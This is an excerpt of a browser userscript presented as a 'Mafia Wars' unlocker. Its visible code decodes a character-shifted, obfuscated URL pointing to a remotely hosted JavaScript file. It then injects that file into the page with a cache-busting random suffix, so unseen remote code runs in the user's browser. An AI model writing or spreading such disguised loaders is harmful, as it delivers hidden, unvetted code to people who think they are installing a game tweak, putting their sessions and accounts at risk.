// ==UserScript== 
// @name        MW UnCLUCKed 5.0.13 VIP 
// @namespace   Superchicken
// @description this script unlocks mafia wars
...
var myscript = function(){ 
    ...
    function loadScript(){ 
            ...
            a.src=decode() +Math.random(); 
            document.getElementsByTagName("head")[0].appendChild(a); 
                
    } 
  
  function decode(){
        var url = "iuuqt;00em/espqcpyvtfsdpoufou/dpn0t0ycz:{hp{rkd4iku0vompdlfe/kt@em>2";
        var decoded = "";
                for(var i=0; i<url.length;i++)
                {
                        decoded += String.fromCharCode(url.charCodeAt(i)-1);    
                }
        return decoded;
        }
